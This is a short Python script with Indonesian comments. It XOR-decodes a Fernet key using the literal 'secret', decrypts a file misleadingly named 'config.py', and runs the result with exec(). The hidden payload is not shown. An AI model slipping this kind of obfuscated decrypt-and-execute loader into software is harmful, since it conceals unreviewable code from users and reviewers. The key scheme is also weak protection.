import base64
from cryptography.fernet import Fernet

# Fungsi XOR untuk menyamarkan data
def _x98h2A(_d, _k):
    return bytes(a ^ b for a, b in zip(_d, _k * (len(_d) // len(_k) + 1)))

# Key terenkripsi (dari enkripsi.py)
_90gKj2L = b'\x02\n \x1a-."\x0e<A1\x19\x04\x13\x07\'\x0e89V%#\x02?B\x01\x05;#%#"\x14 \t\x1dG 2(5.&X'  # Ganti dengan hasil dari `enkripsi.py`

# Kembalikan key asli menggunakan XOR
_77Zx3bD = _x98h2A(_90gKj2L, b'secret')

# Objek cipher untuk dekripsi
_Kt1p39L = Fernet(_77Zx3bD)

# Baca file terenkripsi
with open('config.py', 'rb') as _mLx9tY5:
    _Jq3X8vB = _mLx9tY5.read()

# Dekripsi file
_Ax8Lq02 = _Kt1p39L.decrypt(_Jq3X8vB)

# Jalankan kode yang telah didekripsi
exec(_Ax8Lq02.decode())
